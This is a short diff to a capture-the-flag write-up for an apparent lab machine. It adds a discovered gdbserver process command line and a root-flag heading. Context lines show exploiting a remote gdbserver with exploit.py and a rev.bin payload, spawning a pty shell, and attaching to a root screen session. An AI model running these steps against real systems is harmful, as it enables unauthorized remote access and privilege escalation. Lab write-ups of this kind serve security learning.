@@ -349,6 +349,9 @@ Just read the /proc/{pid}/cmdline file like this, where pid is a variable number
 
 <img src="/img/backdoor/intruder1.PNG.PNG" alt="Getting-gz" width="800" height="440">
 
+I found this cmdline for PID 954
+bin/sh-cwhile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
+
 ## user flag
 search about  gdbserver
 ```
@@ -478,6 +481,8 @@ python3 exploit.py   10.10.11.125:1337 rev.bin
 ```
 python3 -c "import pty;pty.spawn('/bin/bash')"
 ```
+
+## root flag
 ```
 export TERM=xterm
 screen -x root/root
